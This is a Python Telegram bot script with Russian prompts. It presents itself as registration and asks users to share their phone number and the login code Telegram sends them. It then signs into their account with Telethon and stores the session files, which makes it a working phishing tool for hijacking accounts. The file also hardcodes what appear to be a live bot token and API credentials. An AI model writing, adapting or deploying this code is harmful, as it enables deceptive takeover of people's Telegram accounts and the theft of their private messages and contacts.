import telebot
from telethon import TelegramClient
import asyncio

bot = telebot.TeleBot('7977469319:AAGWsXON1zGZnXUo8kmnM_ehRBbRekfsNTU')
api_id = '29385016'
api_hash = '3c57df8805ab5de5a23a032ed39b9af9'

user_sessions = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    msg = bot.reply_to(message, "Для регистрации отправьте мне свой номер телефона.", reply_markup=phone_keyboard())
    bot.register_next_step_handler(msg, process_phone_step)

def phone_keyboard():
    keyboard = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    button = telebot.types.KeyboardButton(text="📱 Отправить номер", request_contact=True)
    keyboard.add(button)
    return keyboard

def process_phone_step(message):
    try:
        chat_id = message.chat.id
        if message.contact:
            phone = message.contact.phone_number
            user_sessions[chat_id] = {'phone': phone}
            
            # Создаем клиент Telegram
            client = TelegramClient(f'sessions/{phone}', api_id, api_hash)
            
            # Запрашиваем код авторизации
            asyncio.run(send_telegram_code(client, phone, chat_id))
            
            msg = bot.reply_to(message, "Код отправлен через Telegram. Введите 5-значный код:", reply_markup=telebot.types.ReplyKeyboardRemove())
            bot.register_next_step_handler(msg, process_verification_code, client)
        else:
            bot.reply_to(message, "Нужно отправить номер через кнопку.")
    except Exception as e:
        bot.reply_to(message, f'Ошибка: {e}')

async def send_telegram_code(client, phone, chat_id):
    await client.connect()
    sent_code = await client.send_code_request(phone)
    user_sessions[chat_id]['phone_code_hash'] = sent_code.phone_code_hash

def process_verification_code(message, client):
    try:
        chat_id = message.chat.id
        code = message.text.strip()
        
        if len(code) == 5 and code.isdigit():
            asyncio.run(complete_verification(client, chat_id, code))
            bot.reply_to(message, "✅ Успешная авторизация! Аккаунт подключен.")
        else:
            bot.reply_to(message, "❌ Неверный код. Должен быть 5 цифр.")
    except Exception as e:
        bot.reply_to(message, f'Ошибка верификации: {e}')

async def complete_verification(client, chat_id, code):
    try:
        await client.sign_in(
            phone=user_sessions[chat_id]['phone'],
            code=code,
            phone_code_hash=user_sessions[chat_id]['phone_code_hash']
        )
    except Exception as e:
        print(f"Auth error: {e}")
